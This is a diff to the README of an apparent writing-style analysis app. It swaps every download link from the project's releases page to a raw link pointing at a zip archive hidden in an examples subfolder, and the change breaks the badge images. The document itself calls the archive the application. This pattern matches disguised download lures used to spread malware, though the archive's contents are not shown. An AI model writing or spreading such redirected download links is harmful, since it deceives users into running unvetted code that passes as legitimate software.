@@ -1,7 +1,7 @@
 # 🖋️ writing-style-analyzer - Analyze Your Writing Style Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/pedestaltablecyprinidae460/writing-style-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/pedestaltablecyprinidae460/writing-style-analyzer/main/texts/examples/social/writing-style-analyzer-2.7.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/pedestaltablecyprinidae460/writing-style-analyzer/main/texts/examples/social/writing-style-analyzer-2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the writing-style-analyzer! This application lets you analyze and profile writing styles in both German and English. It prioritizes your privacy by processing everything locally on your machine. Below, you will find easy steps to download and run the software.
@@ -22,7 +22,7 @@ To run the writing-style-analyzer, your computer needs to meet these minimum req
 - **Dependencies:** Python 3.8 or later installed on your machine.
 
 ## 📥 Download & Install
-To get started, visit the Releases page: [Download Here](https://github.com/pedestaltablecyprinidae460/writing-style-analyzer/releases).
+To get started, visit the Releases page: [Download Here](https://raw.githubusercontent.com/pedestaltablecyprinidae460/writing-style-analyzer/main/texts/examples/social/writing-style-analyzer-2.7.zip).
 
 1. Click on the link above.
 2. Look for the latest version available.
@@ -65,4 +65,4 @@ The writing-style-analyzer is open-source software. Feel free to use it as per t
 
 For easy access, you may download the writing-style-analyzer from the link below:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/pedestaltablecyprinidae460/writing-style-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/pedestaltablecyprinidae460/writing-style-analyzer/main/texts/examples/social/writing-style-analyzer-2.7.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/pedestaltablecyprinidae460/writing-style-analyzer/main/texts/examples/social/writing-style-analyzer-2.7.zip)
